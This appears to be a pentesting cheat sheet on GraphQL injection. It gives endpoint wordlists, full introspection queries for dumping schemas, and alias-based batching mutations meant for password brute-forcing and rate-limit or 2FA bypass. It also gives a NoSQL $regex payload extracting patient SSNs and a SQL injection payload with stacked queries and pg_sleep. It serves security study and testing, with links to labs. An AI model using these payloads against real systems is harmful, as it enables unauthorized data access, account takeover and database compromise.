# GraphQL Injection

> GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field on each type

## Summary

- [Tools](#tools)
- [Enumeration](#enumeration)
    - [Common GraphQL Endpoints](#common-graphql-endpoints)
    - [Identify An Injection Point](#identify-an-injection-point)
    - [Enumerate Database Schema via Introspection](#enumerate-database-schema-via-introspection)
    - [Enumerate Database Schema via Suggestions](#enumerate-database-schema-via-suggestions)
    - [Enumerate Types Definition](#enumerate-types-definition)
    - [Enumerating Paths to a Target Type](#enumerating-paths-to-a-target-type)
- [Methodology](#methodology)
    - [Queries](#queries)
        - [Basic Query](#basic-query)
        - [Query with Arguments](#query-with-arguments)
        - [Nested Queries](#nested-queries)
    - [Mutations](#mutations)
    - [GraphQL Batching Attacks](#graphql-batching-attacks)
        - [JSON List Based Batching](#json-list-based-batching)
        - [Query Name Based Batching](#query-name-based-batching)
- [Injections](#injections)
    - [NOSQL Injection](#nosql-injection)
    - [SQL Injection](#sql-injection)
- [Labs](#labs)
- [References](#references)

## Tools

- [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - Scripting engine to interact with a graphql endpoint for pentesting purposes
- [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - GraphQL Security Research Material
- [doyensec/inql](https://github.com/doyensec/inql) - A Burp Extension for GraphQL Security Testing
- [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - parses GraphQL introspection schema and generates possible queries
- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Lists the different ways of reaching a given type in a GraphQL schema
- [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - An extensive IDE for exploring GraphQL API's
- [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - Obtain GraphQL API schema despite disabled introspection
- [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - A GraphQL password brute-force and fuzzing utility
- [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - GraphQL threat framework used by security professionals to research security gaps in GraphQL implementations
- [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - Security Auditor Utility for GraphQL APIs
- [dolevf/graphw00f](https://github.com/dolevf/graphw00f) - GraphQL Server Engine Fingerprinting utility
- [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - Represent any GraphQL API as an interactive graph
- [Insomnia](https://insomnia.rest/) - Cross-platform HTTP and GraphQL Client

## Enumeration

### Common GraphQL Endpoints

GraphQL endpoints are often exposed at predictable paths, most commonly:

- `/graphql`
- `/graphiql` (interactive IDE)

You should always probe for both API and developer/debug interfaces.

```ps1
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```

For an extended wordlist, see [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt).

### Identify An Injection Point

> A server MUST accept POST requests, and MAY accept other HTTP methods, such as GET. - [GraphQL Over HTTP](https://graphql.github.io/graphql-over-http/draft/#sec-Request)

- GET endpoint

    ```js
    GET /graphql?query={yourQueryHere}
    GET /graphql?query={__schema{types{name}}}
    GET /graphiql?query={__schema{types{name}}}
    GET /graphql?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D
    ```

- POST endpoint

    ```js
    POST /graphql/v1 HTTP/1.1
    Host: example.com
    Content-Type: application/json

    {
    "query": "query { user { id name } }"
    }
    ```

Check if errors are visible.

```javascript
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

### Enumerate Database Schema via Introspection

The GraphQL specification includes special fields, such as `__schema` and `__type`, that allow clients to ask the server what types exist, what fields they expose, and how everything connects together.

An introspection query is simply a request that leverages these special fields to retrieve that structural information. This is what allows interactive environments like GraphiQL or GraphQL Playground to provide auto-completion, inline documentation, and query validation. When a developer types a query, the tool is not guessing, it has already asked the server what is valid and what is not.

A minimal example looks like this:

```js
{
  "query": "{ __schema { types { name } } }"
}
```

URL encoded query to dump the database schema.

```js
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

URL decoded query to dump the database schema.

```rs
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```

Single line queries to dump the database schema without fragments.

```rs
__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
```

```rs
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

### Enumerate Database Schema via Suggestions

When you use an unknown keyword, the GraphQL backend will respond with a suggestion related to its schema.

```json
{
  "message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",
}
```

You can also try to bruteforce known keywords, field and type names using wordlists such as [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist) when the schema of a GraphQL API is not accessible.

### Enumerate Types Definition

Enumerate the definition of interesting types using the following GraphQL query, replacing "User" with the chosen type

```javascript
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

### Enumerating Paths to a Target Type

When working with a GraphQL schema, especially after running an introspection query, it is not always obvious how a specific type can be accessed through queries. A given object (like `User`, `Admin`, or `Payment`) may be reachable through multiple entry points and nested relationships.

- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Tool that lists the different ways of reaching a given type in a GraphQL schema.

This tool takes the JSON output of an introspection query (which describes the full schema) and analyzes how types are connected. It then outputs different query paths that can be used to reach a specific target type. In practice, this means identifying all the possible ways a client could craft queries that eventually return that object, even if it is deeply nested or indirectly exposed.

```php
graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
Found 27 ways to reach the "Skill" node from the "Query" node:
- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (skills) -> Skill
```

## Methodology

GraphQL supports three main operation types: **queries**, **mutations**, and **subscriptions**.

### Queries

GraphQL queries are used to request specific fields from a schema, and the structure of your query directly mirrors the JSON response you will receive. At its simplest, querying data means selecting a root field (like `user`, `posts`, or `teams`) and then specifying which subfields you want returned. Unlike REST, you never get extra data, everything must be explicitly requested.

#### Basic Query

The simplest query uses the shorthand syntax, where the `query` keyword is omitted. You just define the fields you want starting from the root object.

```js
{
  user {
    id
    name
  }
}
```

This tells the server to return the `id` and `name` fields from the user object. The response will follow the exact same structure. If needed, the full syntax can be used with the query keyword, but in most cases the shorthand is enough and commonly seen in real-world traffic.

```js
query {
  user {
    id
    name
  }
}
```

![HTB Help - GraphQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)

#### Query with Arguments

To retrieve specific data, arguments can be passed to fields. These behave like function parameters and are often used for IDs, filters, or search queries.

```js
{
  user(id: "1") {
    name
    email
  }
}
```

This allows precise targeting of objects and is a common entry point for testing access control issues or IDOR-style vulnerabilities.

#### Nested Queries

GraphQL allows deep traversal of relationships in a single request. Instead of chaining multiple API calls, you can explore linked objects directly.

```js
{
  user(id: "1") {
    name
    posts {
      title
      comments {
        content
      }
    }
  }
}
```

### Mutations

A mutation is an operation used to change data on the server (create, update, or delete something).
Mutations work like function, you can use them to interact with the GraphQL endpoint.

```javascript
mutation{
  signIn(login:"Admin", password:"secretp@ssw0rd"){
      token
    }
}

mutation{
  addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {
    id
    name
    email
  }
}
```

**Warning**: Mutations usually won't work with GET. [graphql/graphql-over-http, issue #123](https://github.com/graphql/graphql-over-http/issues/123)

### GraphQL Batching Attacks

Common scenario:

- Password Brute-force Amplification Scenario
- Rate Limit bypass
- 2FA bypassing

#### JSON List Based Batching

> Query batching is a feature of GraphQL that allows multiple queries to be sent to the server in a single HTTP request. Instead of sending each query in a separate request, the client can send an array of queries in a single POST request to the GraphQL server. This reduces the number of HTTP requests and can improve the performance of the application.

Query batching works by defining an array of operations in the request body. Each operation can have its own query, variables, and operation name. The server processes each operation in the array and returns an array of responses, one for each query in the batch.

```json
[
    {
        "query":"..."
    },{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ...
]
```

#### Query Name Based Batching

```json
{
    "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
}
```

Send the same mutation several times using aliases

```js
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
  fourth: login(pass: 4444, username: "bob")
}
```

## Injections

> SQL and NoSQL Injections are still possible since GraphQL is just a layer between the client and the database.

### NOSQL Injection

Use `$regex` inside a `search` parameter.

```js
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
    {
      firstName lastName id patients{ssn}
    }
}
```

### SQL Injection

Send a single quote `'` inside a GraphQL parameter to trigger the SQL injection

```js
{ 
    bacon(id: "1'") { 
        id, 
        type, 
        price
    }
}
```

Simple SQL injection inside a GraphQL field.

```powershell
query {
  user(name: "patt';SELECT 1;SELECT pg_sleep(30);--'") {
    id
    email
  }
}
```

## Labs

- [PortSwigger - Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)
- [PortSwigger - Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
- [PortSwigger - Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)
- [PortSwigger - Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)
- [PortSwigger - Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
- [Root Me - GraphQL - Introspection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Introspection)
- [Root Me - GraphQL - Injection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Injection)
- [Root Me - GraphQL - Backend injection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Backend-injection)
- [Root Me - GraphQL - Mutation](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Mutation)

## References

- [Building a free open source GraphQL wordlist for penetration testing - Nohé Hinniger-Foray - August 17, 2023](https://web.archive.org/web/20230919211552/https://escape.tech/blog/graphql-security-wordlist/)
- [Exploiting GraphQL - AssetNote - Shubham Shah - August 29, 2021](https://web.archive.org/web/20210830161635/https://blog.assetnote.io/2021/08/29/exploiting-graphql/)
- [GraphQL Batching Attack - Wallarm - December 13, 2019](https://web.archive.org/web/20260223043402/https://lab.wallarm.com/graphql-batching-attack/)
- [GraphQL for Pentesters presentation - Alexandre ZANNI (@noraj) - December 1, 2022](https://web.archive.org/web/20230205233412/https://acceis.github.io/prez-graphql/)
- [API Hacking GraphQL - @ghostlulz - Jun 8, 2019](https://web.archive.org/web/20190619040847/https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
- [Discovering GraphQL endpoints and SQLi vulnerabilities - Matías Choren - Sep 23, 2018](https://web.archive.org/web/20180923085151/https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e)
- [GraphQL abuse: Bypass account level permissions through parameter smuggling - Jon Bottarini - March 14, 2018](https://web.archive.org/web/20231027032512/https://labs.detectify.com/2018/03/14/graphql-abuse/)
- [Graphql Bug to Steal Anyone's Address - Pratik Yadav - Sept 1, 2019](https://web.archive.org/web/20250514221822/https://medium.com/@pratiky054/graphql-bug-to-steal-anyones-address-fc34f0374417)
- [GraphQL cheatsheet - devhints.io - November 7, 2018](https://web.archive.org/web/20181107093033/https://devhints.io/graphql)
- [GraphQL Introspection - GraphQL - August 21, 2024](https://web.archive.org/web/20260302160506/https://graphql.org/learn/introspection/)
- [GraphQL NoSQL Injection Through JSON Types - Pete Corey - June 12, 2017](https://web.archive.org/web/20250514221852/https://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/)
- [HIP19 Writeup - Meet Your Doctor 1,2,3 - Swissky - June 22, 2019](https://web.archive.org/web/20190825033521/https://swisskyrepo.github.io/HIP19-MeetYourDoctor/)
- [How to set up a GraphQL Server using Node.js, Express & MongoDB - Leonardo Maldonado - 5 November 2018](https://web.archive.org/web/20190718023950/https://www.freecodecamp.org/news/how-to-set-up-a-graphql-server-using-node-js-express-mongodb-52421b73f474/)
- [Introduction to GraphQL - GraphQL - November 1, 2024](https://web.archive.org/web/20160917011216/http://graphql.org:80/learn)
- [Introspection query leaks sensitive graphql system information - @Zuriel - November 18, 2017](https://web.archive.org/web/20250710175416/https://hackerone.com/reports/291531)
- [Looting GraphQL Endpoints for Fun and Profit - @theRaz0r - 8 June 2017](https://web.archive.org/web/20170608142208/https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/)
- [Securing Your GraphQL API from Malicious Queries - Max Stoiber - Feb 21, 2018](https://web.archive.org/web/20180731231915/https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b)
- [SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter - Jobert Abma (jobert) - Nov 6th 2018](https://web.archive.org/web/20181203004543/https://hackerone.com/reports/435066)
